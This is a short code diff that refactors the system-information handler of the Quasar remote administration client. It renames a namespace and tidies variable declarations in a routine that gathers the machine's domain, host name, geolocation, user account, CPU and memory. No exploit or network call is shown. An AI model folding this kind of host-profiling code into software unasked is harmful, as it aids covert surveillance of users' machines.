@@ -9,7 +9,7 @@ using System.IO;
 using System.Net.NetworkInformation;
 using Quasar.Client.IO;
 
-namespace Quasar.Client.Messages
+namespace Quasar.Client.MessageHandlers
 {
     public class SystemInformationHandler : IMessageProcessor
     {
@@ -31,15 +31,15 @@ namespace Quasar.Client.Messages
         {
             try
             {
-                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
+                var properties = IPGlobalProperties.GetIPGlobalProperties();
 
-                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
-                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
+                var domainName = !string.IsNullOrEmpty(properties.DomainName) ? properties.DomainName : "-";
+                var hostName = !string.IsNullOrEmpty(properties.HostName) ? properties.HostName : "-";
 
                 var geoInfo = GeoInformationFactory.GetGeoInformation();
                 var userAccount = new UserAccount();
 
-                List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
+                var lstInfos = new List<Tuple<string, string>>
                 {
                     new Tuple<string, string>("Processor (CPU)", HardwareDevices.CpuName),
                     new Tuple<string, string>("Memory (RAM)", $"{HardwareDevices.TotalPhysicalMemory} MB"),
